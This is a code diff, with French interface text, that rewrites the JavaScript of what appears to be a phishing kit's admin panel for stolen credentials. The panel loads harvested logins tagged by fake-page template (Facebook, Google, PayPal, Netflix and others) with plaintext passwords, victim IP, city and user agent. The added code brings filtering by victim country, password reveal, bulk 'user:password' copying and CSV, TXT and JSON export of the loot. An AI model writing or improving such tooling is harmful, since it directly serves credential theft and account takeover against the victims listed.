-        async function loadLogs(){try{const r=await fetch('/api/credentials');const d=await r.json();allLogs=d.credentials;updateTemplateFilter();applyFilters();}catch(e){showToast('Erreur','Chargement impossible','error');}}
-        function updateTemplateFilter(){const t=[...new Set(allLogs.map(l=>l.template_name))],s=document.getElementById('templateFilter');s.innerHTML='<option value="">Tous les templates</option>';t.forEach(tn=>{if(tn){const o=document.createElement('option');o.value=tn;o.textContent=tn;s.appendChild(o);}});}
-        function applyFilters(){const s=document.getElementById('searchInput').value.toLowerCase(),t=document.getElementById('templateFilter').value,df=document.getElementById('dateFrom').value,dt=document.getElementById('dateTo').value;
-            filteredLogs=allLogs.filter(l=>{if(s){const x=`${l.username} ${l.email} ${l.ip} ${l.country} ${l.city} ${l.target} ${l.template_name}`.toLowerCase();if(!x.includes(s))return false;}if(t&&l.template_name!==t)return false;if(df||dt){if(!l.timestamp)return true;const ld=new Date(l.timestamp).toISOString().split('T')[0];if(df&&ld<df)return false;if(dt&&ld>dt)return false;}return true;});
-            filteredLogs.sort((a,b)=>new Date(b.timestamp)-new Date(a.timestamp));updateStats();renderPage();}
-        function updateStats(){document.getElementById('totalLogs').textContent=filteredLogs.length;document.getElementById('uniqueIPsCount').textContent=new Set(filteredLogs.map(l=>l.ip)).size;document.getElementById('countriesCountMini').textContent=new Set(filteredLogs.map(l=>l.country)).size;
-            const td=new Date().toDateString();document.getElementById('todayLogs').textContent=filteredLogs.filter(l=>l.timestamp&&new Date(l.timestamp).toDateString()===td).length;
-            const tpls={};filteredLogs.forEach(l=>{tpls[l.template_name]=(tpls[l.template_name]||0)+1;});const top=Object.entries(tpls).sort((a,b)=>b[1]-a[1])[0];document.getElementById('topTemplateMini').textContent=top?top[0]:'-';}
-        function renderPage(){totalPages=Math.ceil(filteredLogs.length/perPage);if(currentPage>totalPages)currentPage=Math.max(1,totalPages);const s=(currentPage-1)*perPage,e=s+perPage,pl=filteredLogs.slice(s,e);renderTable(pl);renderPagination();document.getElementById('paginationInfo').textContent=`Affichage de ${s+1}-${Math.min(e,filteredLogs.length)} sur ${filteredLogs.length} logs`;}
-        function renderTable(logs){const t=document.getElementById('logsTableBody');if(!logs.length){t.innerHTML='<tr><td colspan="9" style="text-align:center;padding:60px;">Aucun log</td></tr>';return;}
-            t.innerHTML=logs.map(l=>{const tc=`badge-${(l.template_type||'custom').toLowerCase()}`,f=getFlag(l.country),d=l.timestamp?new Date(l.timestamp).toLocaleString('fr-FR'):'-';
-                return `<tr><td><input type="checkbox" class="log-checkbox" value="${l.id}" onchange="updateSelected()"></td><td><span class="template-badge ${tc}">${l.template_name||'-'}</span></td><td>${l.username||'-'}</td><td><div class="password-cell"><span class="password-hidden" onclick="revealPassword(this,'${l.password||''}')">••••••••</span><button class="copy-btn" onclick="copyToClipboard('${l.password||''}')"><i class="fas fa-copy"></i></button></div></td><td><div class="ip-cell"><code>${l.ip||'-'}</code><button class="copy-btn" onclick="copyToClipboard('${l.ip||''}')"><i class="fas fa-copy"></i></button></div></td><td><div class="country-cell"><span class="country-flag">${f}</span><span>${l.country||'-'}<br><small>${l.city||''}</small></span></div></td><td>${l.target||'-'}</td><td>${d}</td><td><div class="action-cell"><div class="action-icon" onclick="viewDetails('${l.id}')"><i class="fas fa-eye"></i></div><div class="action-icon" onclick="copyRow('${l.id}')"><i class="fas fa-copy"></i></div><div class="action-icon delete" onclick="deleteLog('${l.id}')"><i class="fas fa-trash"></i></div></div></td></tr>`;}).join('');}
+        let sortColumn='timestamp',sortDirection='desc';
+        let visibleColumns={template:true,username:true,password:true,ip:true,location:true,target:true,date:true,actions:true};
+        
+        // 1-5: Toast & Utilities
+        function showToast(t,m,ty='info'){const c=document.getElementById('toastContainer'),to=document.createElement('div');to.className=`toast ${ty}`;let i='info-circle';if(ty==='success')i='check-circle';if(ty==='error')i='exclamation-circle';if(ty==='warning')i='exclamation-triangle';to.innerHTML=`<i class="fas fa-${i}"></i><div><div style="font-weight:600;">${t}</div><div style="font-size:12px;">${m}</div></div>`;c.appendChild(to);setTimeout(()=>to.remove(),4000);}
+        function debounceSearch(){clearTimeout(searchTimeout);searchTimeout=setTimeout(()=>applyFilters(),400);}
+        function formatDate(d){if(!d)return'-';const dt=new Date(d);return dt.toLocaleString('fr-FR',{day:'2-digit',month:'2-digit',year:'numeric',hour:'2-digit',minute:'2-digit',second:'2-digit'});}
         function getFlag(c){const f={'France':'🇫🇷','Madagascar':'🇲🇬','USA':'🇺🇸','Canada':'🇨🇦','Allemagne':'🇩🇪','Espagne':'🇪🇸','Italie':'🇮🇹','Royaume-Uni':'🇬🇧','Belgique':'🇧🇪','Suisse':'🇨🇭','Inconnu':'🌍'};return f[c]||'🌍';}
+        function getBadgeClass(t){const m={'facebook':'fb','google':'gg','instagram':'ig','linkedin':'li','netflix':'nf','paypal':'pp'};return m[(t||'').toLowerCase()]||'custom';}
+        
+        // 6-10: Data Loading
+        async function loadLogs(){try{const r=await fetch('/api/credentials');const d=await r.json();allLogs=d.credentials;updateFilters();applyFilters();}catch(e){showToast('Erreur','Chargement impossible','error');}}
+        function updateFilters(){const t=[...new Set(allLogs.map(l=>l.template_name))],c=[...new Set(allLogs.map(l=>l.country))];fillSelect('templateFilter',t);fillSelect('countryFilter',c);}
+        function fillSelect(id,options){const s=document.getElementById(id),first=s.options[0];s.innerHTML='';s.appendChild(first);options.filter(o=>o).forEach(o=>{const opt=document.createElement('option');opt.value=o;opt.textContent=o;s.appendChild(opt);});}
+        function applyFilters(){const s=document.getElementById('searchInput').value.toLowerCase(),t=document.getElementById('templateFilter').value,c=document.getElementById('countryFilter').value,df=document.getElementById('dateFrom').value,dt=document.getElementById('dateTo').value;
+            filteredLogs=allLogs.filter(l=>{if(s){const x=`${l.username||''} ${l.email||''} ${l.ip||''} ${l.country||''} ${l.city||''} ${l.target||''} ${l.template_name||''}`.toLowerCase();if(!x.includes(s))return false;}if(t&&l.template_name!==t)return false;if(c&&l.country!==c)return false;if(df||dt){if(!l.timestamp)return true;const ld=new Date(l.timestamp).toISOString().split('T')[0];if(df&&ld<df)return false;if(dt&&ld>dt)return false;}return true;});
+            sortFiltered();updateStats();renderPage();}
+        function sortFiltered(){filteredLogs.sort((a,b)=>{let av=a[sortColumn],bv=b[sortColumn];if(sortColumn==='timestamp'){av=new Date(av||0);bv=new Date(bv||0);}if(sortColumn==='ip'){av=ipToNumber(av);bv=ipToNumber(bv);}if(av<bv)return sortDirection==='asc'?-1:1;if(av>bv)return sortDirection==='asc'?1:-1;return 0;});}
+        function ipToNumber(ip){if(!ip)return 0;return ip.split('.').reduce((sum,octet)=>sum*256+parseInt(octet,10),0);}
+        
+        // 11-15: Stats & Rendering
+        function updateStats(){const t=filteredLogs.length;document.getElementById('totalLogs').textContent=t;document.getElementById('uniqueIPs').textContent=new Set(filteredLogs.map(l=>l.ip)).size;document.getElementById('countriesCount').textContent=new Set(filteredLogs.map(l=>l.country)).size;const td=new Date().toDateString();document.getElementById('todayLogs').textContent=filteredLogs.filter(l=>l.timestamp&&new Date(l.timestamp).toDateString()===td).length;const tpls={};filteredLogs.forEach(l=>{tpls[l.template_name]=(tpls[l.template_name]||0)+1;});const top=Object.entries(tpls).sort((a,b)=>b[1]-a[1])[0];document.getElementById('topTemplateStat').textContent=top?top[0]:'-';const ctrs={};filteredLogs.forEach(l=>{ctrs[l.country]=(ctrs[l.country]||0)+1;});const topC=Object.entries(ctrs).sort((a,b)=>b[1]-a[1])[0];document.getElementById('topCountryStat').textContent=topC?topC[0]:'-';document.getElementById('filteredCount').textContent=t;}
+        function renderPage(){totalPages=Math.ceil(filteredLogs.length/perPage);if(currentPage>totalPages)currentPage=Math.max(1,totalPages);const s=(currentPage-1)*perPage,e=s+perPage,pl=filteredLogs.slice(s,e);renderTable(pl);renderPagination();document.getElementById('visibleLogs').textContent=pl.length;document.getElementById('paginationInfo').textContent=`Affichage de ${s+1}-${Math.min(e,filteredLogs.length)} sur ${filteredLogs.length} logs`;}
+        function renderTable(logs){const t=document.getElementById('logsTableBody');if(!logs.length){t.innerHTML='<tr><td colspan="9" style="text-align:center;padding:60px;">Aucun log trouvé</td></tr>';return;}
+            t.innerHTML=logs.map(l=>{const tc=getBadgeClass(l.template_name),f=getFlag(l.country),d=formatDate(l.timestamp);
+                return `<tr><td><input type="checkbox" class="log-checkbox" value="${l.id}" onchange="updateSelected()"></td><td><span class="badge-tpl badge-${tc}">${l.template_name||'-'}</span></td><td>${l.username||l.email||'-'}</td><td><div class="pwd-cell"><span class="pwd-hidden" onclick="revealPassword(this,'${(l.password||'').replace(/'/g,"\\'")}')">••••••••</span><button class="copy-btn" onclick="copyToClipboard('${(l.password||'').replace(/'/g,"\\'")}')"><i class="fas fa-copy"></i></button></div></td><td><div class="ip-cell"><code>${l.ip||'-'}</code><button class="copy-btn" onclick="copyToClipboard('${l.ip||''}')"><i class="fas fa-copy"></i></button></div></td><td><div class="country-cell"><span class="flag">${f}</span><span>${l.country||'-'}<br><small>${l.city||''}</small></span></div></td><td>${l.target||'-'}</td><td>${d}</td><td><div class="action-cell"><div class="action-icon view" onclick="viewDetails('${l.id}')"><i class="fas fa-eye"></i></div><div class="action-icon" onclick="copyRow('${l.id}')"><i class="fas fa-copy"></i></div><div class="action-icon delete" onclick="deleteLog('${l.id}')"><i class="fas fa-trash"></i></div></div></td></tr>`;}).join('');}
         function renderPagination(){const c=document.getElementById('pagination');let h='';h+=`<div class="page-btn ${currentPage===1?'disabled':''}" onclick="${currentPage>1?`goToPage(${currentPage-1})`:''}"><i class="fas fa-chevron-left"></i></div>`;const s=Math.max(1,currentPage-2),e=Math.min(totalPages,currentPage+2);if(s>1){h+=`<div class="page-btn" onclick="goToPage(1)">1</div>`;if(s>2)h+=`<div class="page-btn disabled">...</div>`;}for(let i=s;i<=e;i++){h+=`<div class="page-btn ${i===currentPage?'active':''}" onclick="goToPage(${i})">${i}</div>`;}if(e<totalPages){if(e<totalPages-1)h+=`<div class="page-btn disabled">...</div>`;h+=`<div class="page-btn" onclick="goToPage(${totalPages})">${totalPages}</div>`;}h+=`<div class="page-btn ${currentPage===totalPages?'disabled':''}" onclick="${currentPage<totalPages?`goToPage(${currentPage+1})`:''}"><i class="fas fa-chevron-right"></i></div>`;c.innerHTML=h;}
+        
+        // 16-20: Pagination & Selection
         function goToPage(p){currentPage=p;renderPage();}
         function changePerPage(){perPage=parseInt(document.getElementById('perPageSelect').value);currentPage=1;renderPage();}
-        function refreshLogs(){loadLogs();showToast('Actualisation','Logs mis à jour','success');}
-        function revealPassword(e,p){if(e.classList.contains('password-hidden')){e.textContent=p;e.classList.remove('password-hidden');e.classList.add('password-shown');}else{e.textContent='••••••••';e.classList.remove('password-shown');e.classList.add('password-hidden');}}
-        function copyToClipboard(t){navigator.clipboard?.writeText(t);showToast('Copié','Texte copié','success');}
-        function copyRow(id){const l=allLogs.find(lo=>lo.id===id);if(l){copyToClipboard(`Username: ${l.username}\nPassword: ${l.password}\nIP: ${l.ip}\nCountry: ${l.country}\nTemplate: ${l.template_name}`);}}
-        async function deleteLog(id){if(!confirm('Supprimer ?'))return;try{await fetch(`/api/credentials?id=${id}`,{method:'DELETE'});showToast('Supprimé','Log supprimé','success');loadLogs();}catch(e){showToast('Erreur','Suppression impossible','error');}}
-        async function clearAllLogs(){if(!confirm('⚠️ Supprimer TOUS les logs ?'))return;try{await fetch('/api/credentials',{method:'DELETE'});showToast('Supprimé','Tous les logs supprimés','success');loadLogs();}catch(e){showToast('Erreur','Suppression impossible','error');}}
+        function updateSelected(){selectedLogs.clear();document.querySelectorAll('.log-checkbox:checked').forEach(c=>selectedLogs.add(c.value));const cnt=selectedLogs.size;document.getElementById('bulkCount').textContent=cnt;document.getElementById('bulkBar').classList.toggle('show',cnt>0);}
         function toggleSelectAll(){const ca=document.getElementById('selectAllCheck');document.querySelectorAll('.log-checkbox').forEach(c=>c.checked=ca.checked);updateSelected();}
-        function updateSelected(){selectedLogs.clear();document.querySelectorAll('.log-checkbox:checked').forEach(c=>selectedLogs.add(c.value));}
-        function selectAll(){document.querySelectorAll('.log-checkbox').forEach(c=>c.checked=true);document.getElementById('selectAllCheck').checked=true;updateSelected();}
-        async function deleteSelected(){if(!selectedLogs.size){showToast('Info','Aucun log sélectionné','info');return;}if(!confirm(`Supprimer ${selectedLogs.size} log(s) ?`))return;try{for(const id of selectedLogs){await fetch(`/api/credentials?id=${id}`,{method:'DELETE'});}showToast('Supprimé',`${selectedLogs.size} log(s) supprimé(s)`,'success');selectedLogs.clear();document.getElementById('selectAllCheck').checked=false;loadLogs();}catch(e){showToast('Erreur','Suppression impossible','error');}}
-        function viewDetails(id){const l=allLogs.find(lo=>lo.id===id);if(!l)return;const m=document.getElementById('detailModal'),c=document.getElementById('modalContent');c.innerHTML=`<div class="detail-label">Template:</div><div class="detail-value">${l.template_name||'-'}</div><div class="detail-label">Username:</div><div class="detail-value">${l.username||'-'}</div><div class="detail-label">Password:</div><div class="detail-value">${l.password||'-'}</div><div class="detail-label">IP:</div><div class="detail-value">${l.ip||'-'}</div><div class="detail-label">Pays:</div><div class="detail-value">${l.country||'-'}</div><div class="detail-label">Ville:</div><div class="detail-value">${l.city||'-'}</div><div class="detail-label">Cible:</div><div class="detail-value">${l.target||'-'}</div><div class="detail-label">Date:</div><div class="detail-value">${l.timestamp?new Date(l.timestamp).toLocaleString('fr-FR'):'-'}</div>`;m.style.display='flex';}
+        function selectAll(){document.querySelectorAll('.log-checkbox').forEach(c=>c.checked=true);document.getElementById('selectAllCheck').checked=true;updateSelected();showToast('Sélection','Tous les logs visibles sélectionnés','info');}
+        function deselectAll(){document.querySelectorAll('.log-checkbox').forEach(c=>c.checked=false);document.getElementById('selectAllCheck').checked=false;updateSelected();}
+        
+        // 21-25: Actions sur logs
+        function revealPassword(e,p){if(e.classList.contains('pwd-hidden')){e.textContent=p;e.classList.remove('pwd-hidden');e.classList.add('pwd-shown');}else{e.textContent='••••••••';e.classList.remove('pwd-shown');e.classList.add('pwd-hidden');}}
+        function copyToClipboard(t){navigator.clipboard?.writeText(t);showToast('Copié','Texte copié','success');}
+        function copyRow(id){const l=allLogs.find(lo=>lo.id===id);if(l){copyToClipboard(`Username: ${l.username||l.email}\nPassword: ${l.password}\nIP: ${l.ip}\nCountry: ${l.country}\nTemplate: ${l.template_name}`);}}
+        async function deleteLog(id){if(!confirm('Supprimer ce log ?'))return;try{await fetch(`/api/credentials?id=${id}`,{method:'DELETE'});showToast('Supprimé','Log supprimé','success');loadLogs();}catch(e){showToast('Erreur','Suppression impossible','error');}}
+        async function clearAllLogs(){if(!confirm('⚠️ Supprimer TOUS les logs ? Irréversible !'))return;try{await fetch('/api/credentials',{method:'DELETE'});showToast('Supprimé','Tous les logs supprimés','success');loadLogs();}catch(e){showToast('Erreur','Suppression impossible','error');}}
+        
+        // 26-30: Bulk Actions
+        async function deleteSelected(){if(!selectedLogs.size)return showToast('Info','Aucun log sélectionné','info');if(!confirm(`Supprimer ${selectedLogs.size} log(s) ?`))return;try{for(const id of selectedLogs){await fetch(`/api/credentials?id=${id}`,{method:'DELETE'});}showToast('Supprimé',`${selectedLogs.size} log(s) supprimés`,'success');deselectAll();loadLogs();}catch(e){showToast('Erreur','Suppression impossible','error');}}
+        function bulkExport(){if(!selectedLogs.size)return showToast('Info','Aucune sélection','info');const logs=filteredLogs.filter(l=>selectedLogs.has(l.id));exportData(logs,'csv','selection');}
+        function bulkCopy(){if(!selectedLogs.size)return showToast('Info','Aucune sélection','info');const logs=filteredLogs.filter(l=>selectedLogs.has(l.id));copyToClipboard(logs.map(l=>`${l.username||l.email}:${l.password} | ${l.ip} | ${l.country}`).join('\n'));showToast('Copié',`${logs.length} logs copiés`,'success');}
+        function bulkDelete(){deleteSelected();}
+        
+        // 31-35: Filtres rapides
+        function quickFilter(f){document.querySelectorAll('.quick-filter').forEach(b=>b.classList.remove('active'));event.target.classList.add('active');const td=new Date().toDateString();switch(f){case'today':filteredLogs=allLogs.filter(l=>l.timestamp&&new Date(l.timestamp).toDateString()===td);break;case'week':const w=new Date();w.setDate(w.getDate()-7);filteredLogs=allLogs.filter(l=>l.timestamp&&new Date(l.timestamp)>=w);break;case'facebook':filteredLogs=allLogs.filter(l=>(l.template_name||'').toLowerCase().includes('facebook'));break;case'google':filteredLogs=allLogs.filter(l=>(l.template_name||'').toLowerCase().includes('google'));break;case'withPassword':filteredLogs=allLogs.filter(l=>l.password&&l.password.length>0);break;case'france':filteredLogs=allLogs.filter(l=>l.country==='France');break;case'madagascar':filteredLogs=allLogs.filter(l=>l.country==='Madagascar');break;default:filteredLogs=[...allLogs];}sortFiltered();updateStats();renderPage();deselectAll();}
+        
+        // 36-40: Tri
+        function sortTable(col){if(sortColumn===col){sortDirection=sortDirection==='asc'?'desc':'asc';}else{sortColumn=col;sortDirection='asc';}applyFilters();showToast('Tri',`${col} ${sortDirection==='asc'?'↑':'↓'}`,'info');}
+        
+        // 41-45: Export
+        function exportLogs(f){exportData(filteredLogs,f,'logs');}
+        function exportData(data,f,name){if(!data.length){showToast('Info','Aucune donnée','info');return;}let c,m,fn;const d=new Date().toISOString().split('T')[0];if(f==='csv'){c='Template,Username,Password,IP,Country,City,Target,User-Agent,Timestamp\n'+data.map(l=>`"${l.template_name||''}","${l.username||l.email||''}","${l.password||''}","${l.ip||''}","${l.country||''}","${l.city||''}","${l.target||''}","${l.user_agent||''}","${l.timestamp||''}"`).join('\n');m='text/csv';fn=`${name}_${d}.csv`;}else if(f==='txt'){c=data.map(l=>`[${formatDate(l.timestamp)}] ${l.template_name}\n  Username: ${l.username||l.email}\n  Password: ${l.password}\n  IP: ${l.ip}\n  Location: ${l.country}, ${l.city}\n  Target: ${l.target}\n  UA: ${l.user_agent}\n${'-'.repeat(50)}`).join('\n');m='text/plain';fn=`${name}_${d}.txt`;}else if(f==='json'){c=JSON.stringify(data,null,2);m='application/json';fn=`${name}_${d}.json`;}else{showToast('Info','PDF en développement','info');return;}const b=new Blob([c],{type:m}),u=URL.createObjectURL(b),a=document.createElement('a');a.href=u;a.download=fn;a.click();URL.revokeObjectURL(u);showToast('Export',fn,'success');}
+        function copyAllToClipboard(){if(!filteredLogs.length)return showToast('Info','Aucun log','info');copyToClipboard(filteredLogs.map(l=>`${l.username||l.email}:${l.password} | ${l.ip} | ${l.country}`).join('\n'));showToast('Copié',`${filteredLogs.length} logs`,'success');}
+        function printLogs(){window.print();}
+        
+        // 46-50: Modal & UI
+        function viewDetails(id){const l=allLogs.find(lo=>lo.id===id);if(!l)return;const m=document.getElementById('detailModal'),c=document.getElementById('modalContent');c.innerHTML=`<div class="detail-label">Template:</div><div class="detail-value">${l.template_name||'-'}</div><div class="detail-label">Username:</div><div class="detail-value">${l.username||l.email||'-'}</div><div class="detail-label">Password:</div><div class="detail-value">${l.password||'-'}</div><div class="detail-label">IP:</div><div class="detail-value">${l.ip||'-'}</div><div class="detail-label">Pays:</div><div class="detail-value">${l.country||'-'}</div><div class="detail-label">Ville:</div><div class="detail-value">${l.city||'-'}</div><div class="detail-label">Cible:</div><div class="detail-value">${l.target||'-'}</div><div class="detail-label">User-Agent:</div><div class="detail-value" style="font-size:11px;">${l.user_agent||'-'}</div><div class="detail-label">Date:</div><div class="detail-value">${formatDate(l.timestamp)}</div>`;m.style.display='flex';}
         function closeModal(){document.getElementById('detailModal').style.display='none';}
-        function exportLogs(f){if(!filteredLogs.length){showToast('Info','Aucun log','info');return;}let c,m,fn;const d=new Date().toISOString().split('T')[0];if(f==='csv'){c='Template,Username,Password,IP,Country,City,Target,Timestamp\n'+filteredLogs.map(l=>`"${l.template_name}","${l.username}","${l.password}","${l.ip}","${l.country}","${l.city}","${l.target}","${l.timestamp}"`).join('\n');m='text/csv';fn=`logs_${d}.csv`;}else if(f==='txt'){c=filteredLogs.map(l=>`[${l.timestamp}] ${l.template_name}\n  Username: ${l.username}\n  Password: ${l.password}\n  IP: ${l.ip}\n  Location: ${l.country}, ${l.city}\n  Target: ${l.target}\n${'-'.repeat(50)}`).join('\n');m='text/plain';fn=`logs_${d}.txt`;}else if(f==='json'){c=JSON.stringify(filteredLogs,null,2);m='application/json';fn=`logs_${d}.json`;}else{return;}const b=new Blob([c],{type:m}),u=URL.createObjectURL(b),a=document.createElement('a');a.href=u;a.download=fn;a.click();URL.revokeObjectURL(u);showToast('Export',`${fn} téléchargé`,'success');}
-        function copyAllToClipboard(){if(!filteredLogs.length){showToast('Info','Aucun log','info');return;}copyToClipboard(filteredLogs.map(l=>`${l.username}:${l.password} | ${l.ip} | ${l.country}`).join('\n'));}
+        function toggleColumnVisibility(){document.getElementById('columnModal').style.display='flex';}
+        function closeColumnModal(){document.getElementById('columnModal').style.display='none';}
         function toggleAutoRefresh(){autoRefresh=!autoRefresh;if(autoRefresh){refreshInterval=setInterval(()=>loadLogs(),30000);showToast('Auto','Activé (30s)','success');}else{clearInterval(refreshInterval);showToast('Auto','Désactivé','info');}}
-        document.addEventListener('keydown',e=>{if(e.ctrlKey&&e.key==='f'){e.preventDefault();document.getElementById('searchInput').focus();}if(e.ctrlKey&&e.key==='a'){e.preventDefault();selectAll();}if(e.key==='Escape'){closeModal();}if(e.key==='Delete'&&selectedLogs.size>0){deleteSelected();}});
-        document.addEventListener('DOMContentLoaded',()=>{loadLogs();const t=new Date(),w=new Date(t.getTime()-7*86400000);document.getElementById('dateFrom').value=w.toISOString().split('T')[0];document.getElementById('dateTo').value=t.toISOString().split('T')[0];});
+        function refreshLogs(){loadLogs();showToast('Actualisé','Logs mis à jour','success');}
+        
+        // 51-55: Keyboard & Init
+        document.addEventListener('keydown',e=>{if(e.ctrlKey&&e.key==='f'){e.preventDefault();document.getElementById('searchInput').focus();}if(e.ctrlKey&&e.key==='a'){e.preventDefault();selectAll();}if(e.key==='Escape'){closeModal();closeColumnModal();}if(e.key==='Delete'&&selectedLogs.size>0){deleteSelected();}if(e.ctrlKey&&e.key==='e'){e.preventDefault();exportLogs('csv');}});
+        document.addEventListener('DOMContentLoaded',()=>{loadLogs();const t=new Date(),m=new Date(t.getTime()-7*86400000);document.getElementById('dateFrom').value=m.toISOString().split('T')[0];document.getElementById('dateTo').value=t.toISOString().split('T')[0];});
     </script>
 </body>
 </html>
